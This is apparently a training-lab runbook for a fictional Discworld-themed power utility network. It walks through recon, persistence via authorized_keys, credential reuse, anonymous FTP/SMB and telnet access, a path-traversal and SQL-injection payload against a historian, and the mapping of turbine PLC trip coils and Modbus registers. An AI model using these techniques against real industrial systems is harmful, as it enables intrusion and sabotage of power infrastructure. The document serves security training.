# Runbook: wizzards-retreat

## Starting state

`rincewind@wizzards-retreat`? Rincewind is UU Power & Light's remote administrator. Apparently this is his home machine 
from where he does sysadmin remote, possibly including things that were probably never meant to leave the corporate 
network. 

The home directory looks lived-in: a notes file, a `.vpn` directory, a `.ssh-keys` directory with something in it. The 
machine has not announced what its network position is. Let us explore this machine.

## Orientation

```bash
pwd
hostname
whoami
id
ip addr
ip route
arp -a
ss -tulpn
ps aux
ls -la ~
tree -La 2 ~
cat ~/.bash_history
crontab -l
sudo -l
find / -name "*vpn*" 2>/dev/null
find / -name "*.ovpn" 2>/dev/null
find ~/.ssh-keys -type f
```

`ip addr` shows three interfaces with addresses across different ranges. `ip route` shows
direct attached routes to all three. The VPN config that surfaced in the `find` output may
explain what each one connects to; that is a question for the next section. No WireGuard
daemon is running. The machine appears to be multi-homed rather than VPN-tunnelled.

`ss -tulpn` shows SSH on port 22, a status server on port 80, and rpcbind and NFS on their
standard ports. The NFS export was visible from outside; it is served from here.

`arp -a` shows recent contacts. Entries in the 10.10.2.x range, if present, suggest this
machine has been talking to something on that subnet recently.

`~/.bash_history` shows SSH sessions to addresses in the 10.10.2.x range, curl calls to
port 8080 on two of them, an FTP connection to something at 10.10.1.10, and a prior host
scan of the 10.10.1.0/24 subnet. The notes file from the NFS mount listed addresses in
those ranges; these appear to confirm which ones were in active use.

`tree -La 2 ~` shows the home directory including hidden entries: a `.vpn` directory with
a config file, a `.ssh-keys` directory with an SSH key pair, a `.ssh` directory, and
`notes.txt` directly in the home directory. Worth reading.

## Network recon

Three attached routes means three subnets worth mapping.

```bash
nmap -sV 10.10.1.0/24
nmap -sV 10.10.2.0/24
```

The 10.10.1.x sweep finds four live hosts: this machine at 10.10.1.3, a host at 10.10.1.10
with FTP, SSH, telnet, and SMB all open, a host at 10.10.1.20 with SSH only, and a host at
10.10.1.30 with SSH only. Telnet open in a current lab environment is worth noting. The
10.10.1.10 address also appeared in the bash_history as an FTP destination.

The 10.10.2.x sweep finds: port 8080 on 10.10.2.10 and 10.10.2.20, SSH on 10.10.2.30, and
a host at 10.10.2.100 that was not in the notes file. The three addresses at 10.10.2.10,
.20, and .30 match what the notes file listed as historian, SCADA, and engineering
workstation. The 10.10.2.100 address is unexplained for now.

## Loot

```bash
cat notes.txt
cat .vpn/uupl-vpn.conf
find .ssh-keys -type f
```

`notes.txt` is the same file visible from the NFS mount: the engineering workstation,
historian, SCADA, and a legacy system at 10.10.1.10. The VPN config has comments labelling
the AllowedIPs ranges: `10.10.1.0/24` is the enterprise zone, `10.10.2.0/24` the
operational zone. That accounts for the addresses from the nmap and the notes. The
unexplained 10.10.2.100 host is still unexplained. No WireGuard process is running, so the
tunnel appears to be simulated by direct attachment. `~/.ssh-keys/uupl_eng_key` is a
private SSH key. According to notes.txt, it connects to `engineer@10.10.2.30` without a
password. Worth trying.

```bash
find /nfs-export -maxdepth 2 -type f
```

`/nfs-export` is what the NFS server stages before exporting. It contains the same two
files visible from the entry machine's NFS mount: the notes file and the private key.
Confirms the export is live.

## Persistence

This machine connects three zones and accepts password authentication. Worth planting a key
in case the password changes.

Pull the public key directly from unseen-gate without leaving this shell:

```bash
mkdir -p ~/.ssh
ssh ponder@10.10.0.5 'cat ~/.ssh/authorized_keys' >> ~/.ssh/authorized_keys
```

Replace `ponder` with whichever unseen-gate account you are using.

Password authentication also works (`wizzard`), so the key is not strictly necessary
during the current session. Whether it matters depends on how long access needs to last.

## Direct access to the enterprise zone

### hex-legacy-1

nmap showed telnet open alongside FTP, SSH, and SMB. Worth trying before anything else.

```bash
telnet 10.10.1.10
```

```
  Microsoft Windows 95
  Copyright (C) Microsoft Corp 1981-1995.

  UU P&L Network Inventory System v2.3
  Hex Computing Division

  Authorised users only. Contact Ponder Stibbons for access issues.


Microsoft Windows 95 [Version 4.00.950]

C:\> exit
```

No login prompt. The connection lands directly in a shell. Apparently a 1999-era
configuration that was never closed.

The FTP share covers the same files without requiring a shell. Anonymous read is open.

```bash
ftp 10.10.1.10
```

```
Connected to 10.10.1.10.
220 UU P&L FTP Service
Name (10.10.1.10:rincewind): 
```

At the Name prompt: `anonymous`. Password: anything. Browse to find what is there:

```
ls
cd LOGBOOK
ls
get ENGINEER.LOG
quit
```

Or pull it directly via smbclient without interactive prompts:

```bash
smbclient //10.10.1.10/public -N -c "get LOGBOOK/ENGINEER.LOG /tmp/ENGINEER.LOG"
getting file \LOGBOOK\ENGINEER.LOG of size 1592 as /tmp/ENGINEER.LOG (15920000.0 KiloBytes/sec) (average inf KiloBytes/sec)
cat /tmp/ENGINEER.LOG
```

`ENGINEER.LOG` appears to be Ponder Stibbons' informal systems notes. It lists what look
like the current credentials for every device on the network, including the engineering
workstation, historian, SCADA server, and the bursar's workstation. The 10.10.2.100 host
from the earlier scan remains unexplained for now.

### bursar-desk

```bash
ssh bursardesk@10.10.1.20
```

Password: `Octavo1` (from `ENGINEER.LOG`). The shell lands in PowerShell. 

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

*******************************************************************************
*                                                                             *
*   Unseen University Power & Light Co.                                       *
*   BURSAR-DESK, Corporate Workstation                                       *
*                                                                             *
*   This system is provided for authorised UU P&L business use only.         *
*   Unauthorised access is prohibited. Usage may be monitored.                *
*   Contact IT: Ponder Stibbons, ext 201                                      *
*                                                                             *
*******************************************************************************

PS C:\Users\bursardesk> 
```

Run ipconfig to see the network configuration:

```
ipconfig
```

Two adapters appear: one on 10.10.1.20 (enterprise) and one on 10.10.2.100 (the unknown
host from the earlier scan). That resolves the mystery. The workstation is dual-homed, with
a direct path to the historian and SCADA without going through the engineering workstation.

## Direct access to the operational zone

### Engineering workstation

```bash
ssh -i ~/.ssh-keys/uupl_eng_key engineer@10.10.2.30
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

*******************************************************************************
*                                                                             *
*   Unseen University Power & Light Co.                                       *
*   ENG-WS01, Engineering Workstation (Windows 10 Enterprise LTSC)          *
*                                                                             *
*   WARNING: This system has direct access to ICS/OT plant equipment.        *
*   Authorised engineers only. All activity is logged.                        *
*   Contact: Ponder Stibbons, ext 201 / ponder.stibbons@uupl.am             *
*                                                                             *
*******************************************************************************

PS C:\Users\engineer> 
```

No password prompt. The key appears to have been pre-authorised on the workstation.

### Historian

bash_history already showed two curl commands against 10.10.2.10:8080: one to `/assets`
and one to `/report` with a turbine asset and a date range. That gives a starting point.

```bash
curl -s http://10.10.2.10:8080/
curl -s http://10.10.2.10:8080/assets
curl -s "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2024-01-01&to=2024-12-31"
```

The homepage names the service and links to `/report`. `/assets` returns the full list of
tracked asset names. `/report` takes an asset name and date range and returns time-series
data as CSV.

Probing further with common API patterns:

```bash
curl -s "http://10.10.2.10:8080/export?tag=turbine_rpm"
```

Returns `no export for tag: turbine_rpm`. The endpoint exists but the tag maps to a
filename in the server's exports directory. The input is not sanitised.

### Historian: path traversal

```bash
mkdir -p /tmp/loot
curl -s "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/loot/historian.db
```

```
python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM config;')]"
```

```
('db_version', '1.4')
('db_user', 'historian')
('db_pass', 'Historian2015')
('installed', '1997-03-22')
('contact', 'ponder.stibbons@uupl.am')
('ssh_user', 'hist_admin')
('ssh_pass', 'Historian2015')
('ingest_user', 'hist_read')
('ingest_pass', 'history2017')
```

```bash
python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM alarm_config;')]"
```

```
('turbine_rpm', 2700.0, 2850.0, 3150.0, 3300.0, 'RPM', 'Overspeed trip at hi_hi (coil 1 on PLC)')
('turbine_temperature', 380.0, 400.0, 460.0, 490.0, 'C', 'Overtemp trip at hi_hi (coil 2 on PLC)')
('turbine_pressure', 70.0, 78.0, 90.0, 95.0, 'bar', 'Overpressure trip at hi_hi')
('line_voltage_a', 184.0, 196.0, 253.0, 264.0, 'V', 'Relay HR[0]=undervoltage threshold (default 196)')
('line_voltage_b', 184.0, 196.0, 253.0, 264.0, 'V', 'Relay HR[0]=undervoltage threshold (default 196)')
('line_current_a', 0.0, 0.0, 180.0, 200.0, 'A', 'Relay HR[1]=overcurrent threshold (default 200)')
('line_current_b', 0.0, 0.0, 180.0, 200.0, 'A', 'Relay HR[1]=overcurrent threshold (default 200)')
```

No credentials needed for the traversal. `config` returns rows that look like credential
pairs: database, SSH, and ingest accounts.

`alarm_config` has trip thresholds per asset. The description column names the PLC coil or
Modbus register that each threshold maps to: turbine overspeed trips at 3300 RPM and writes
coil 1; overtemp trips at 490°C and writes coil 2; undervoltage and overcurrent thresholds
for the line relays live in holding registers HR[0] and HR[1] respectively. That is a
partial Modbus register map for the turbine PLC, available without authentication.

### Historian: SQL injection

```bash
curl -s "http://10.10.2.10:8080/report?asset=x%27+UNION+SELECT+key,value,%27x%27+FROM+config--&from=0&to=9"
```

Returns what appear to be `db_user`, `db_pass`, `ssh_user`, `ssh_pass`, `ingest_user`,
`ingest_pass` from the config table. Apparently the same credential set as the path
traversal, without pulling the full database file.

### SCADA console

```bash
curl -s http://10.10.2.20:8080/ -u admin:admin
```

```
<!DOCTYPE html>
<html>
<head><title>UU P&L Distribution SCADA</title></head>
<body>
<h2>Unseen University Power &amp; Light Co.</h2>
<h3>City-Wide Distribution, Operator Dashboard</h3>
<p>Historian: 10.10.2.10 &nbsp;|&nbsp;
   <a href="/historian-pass">historian credentials</a></p>
<table border="1" cellpadding="4">
  <tr><th>Asset</th><th>Last Value</th><th>Unit</th><th>Timestamp</th></tr>
  
  <tr>
    <td>frequency_hz_x10</td>
    <td>485.0</td>
    <td>raw</td>
    <td>2026-05-22 15:45:09</td>
  </tr>
  
  <tr>
    <td>line_current_a</td>
    <td>74.0486</td>
    <td>A</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>line_current_b</td>
    <td>80.0364</td>
    <td>A</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>line_voltage_a</td>
    <td>230.8378</td>
    <td>V</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>line_voltage_b</td>
    <td>230.9065</td>
    <td>V</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>meter_power_kw</td>
    <td>16.8254</td>
    <td>kW</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>relay_a_trip</td>
    <td>0.0</td>
    <td>bool</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>relay_b_trip</td>
    <td>0.0</td>
    <td>bool</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>turbine_pressure</td>
    <td>84.7741</td>
    <td>bar</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>turbine_rpm</td>
    <td>2992.9574</td>
    <td>RPM</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
  <tr>
    <td>turbine_temperature</td>
    <td>432.4271</td>
    <td>C</td>
    <td>2026-05-22T15:42:31</td>
  </tr>
  
</table>
<p><small>UU P&L SCADA v2.1, Hex Computing Division</small></p>
</body>
</html>
```

The homepage is a live operator dashboard. It pulls the current reading for each tracked
asset from the historian and renders them as an HTML table. The page also links to
`/historian-pass`, which may be worth following. The dashboard itself does not return credentials,
but it confirms what is being monitored and that the historian is reachable.

```bash
curl -s http://10.10.2.20:8080/config -u admin:admin
```

```
# UU P&L SCADA, Connection Configuration
# Written: 2021-08-14  Author: I. Devious, Hex IT
# DO NOT DISTRIBUTE, contains service credentials

[historian]
host     = 10.10.2.10
port     = 8080
user     = hist_read
password = history2017

[alarm_smtp]
host     = mail.uu.am
port     = 587
user     = alarms@uupl.am
password = plantmail123

[scada]
web_user = admin
web_pass = admin
alarm_script = /opt/scada/scripts/send_alarm.sh
```

The `/config` endpoint returns what appear to be historian read credentials, an SMTP
password, and the web credentials. Left over from a monitoring integration, apparently.

## What you can know now

Network sofar:
- Three zones: internet (10.10.0.0/24), enterprise (10.10.1.0/24), operational (10.10.2.0/24)
- wizzards-retreat is triple-homed: 10.10.0.10 / 10.10.1.3 / 10.10.2.3
- bursar-desk is dual-homed: 10.10.1.20 / 10.10.2.100

Access:
- wizzards-retreat: rincewind / wizzard (SSH), key in ~/.ssh-keys/ for engineer@10.10.2.30
- hex-legacy-1 (10.10.1.10): telnet no-auth, FTP anonymous, SMB guest, SSH Administrator / hex123
- bursar-desk (10.10.1.20): bursardesk / Octavo1
- engineer@10.10.2.30: SSH via uupl_eng_key (no password)

From ENGINEER.LOG (hex-legacy-1):
- engineer / spanner99 (engineering workstation)
- hist_admin / Historian2015 (historian SSH)
- hist_read / history2017 (historian ingest)
- scada_admin / W1nd0ws@2016 (SCADA SSH)
- admin / admin (SCADA web)
- Turbine PLC: no password (Modbus, network is the access control)

From historian (path traversal and SQL injection):
- config table: db_user, db_pass, ssh_user, ssh_pass, ingest_user, ingest_pass (values retrieved)
- alarm_config: overspeed trip at 3300 RPM (PLC coil 1), overtemp at 490°C (coil 2), undervoltage threshold in HR[0], overcurrent threshold in HR[1]

From SCADA /config:
- Historian read credentials, SMTP password, and web credentials present
